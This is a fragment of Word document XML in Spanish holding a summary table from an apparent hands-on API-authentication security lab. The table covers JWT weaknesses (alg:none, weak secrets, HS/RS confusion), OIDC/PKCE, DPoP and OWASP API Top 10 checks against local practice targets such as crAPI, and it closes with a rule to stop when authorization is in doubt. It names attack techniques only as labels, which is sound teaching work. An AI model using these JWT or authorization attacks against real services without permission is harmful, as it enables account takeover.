              <w:t>Pasos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Tema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Qué se comprueba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Riesgo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0–4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Basic, API key, OAuth1, bearer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Credenciales por request, clave estática, firma, replay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Nulo (endpoints de práctica)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Cookies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HttpOnly/Secure/SameSite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Nulo (local)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6–11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JWT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2448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alg:none</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">, secreto débil,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exp</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>/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aud</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>, confusión HS/RS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Local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12–18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OIDC/PKCE/refresh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PKCE obligatorio, claims, rotación, revocación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Local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19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DPoP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Prueba de posesión por request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Local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20–24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OWASP Top 10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BOLA, BOPLA, consumo, inventario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Local (crAPI)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25–30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ID Uruguay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Evidencia + verificación defensiva de tu integración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Nulo / tu entorno</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Regla final:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>si dudás si tenés permiso para un paso, no lo hagas. En seguridad, la autorización también es un control.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00FC693F" w:rsidRPr="0006063C" w:rsidSect="00034616">
      <w:pgSz w:w="12240" w:h="15840"/>
      <w:pgMar w:top="1440" w:right="1224" w:bottom="144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rfc-editor.org/rfc/rfc70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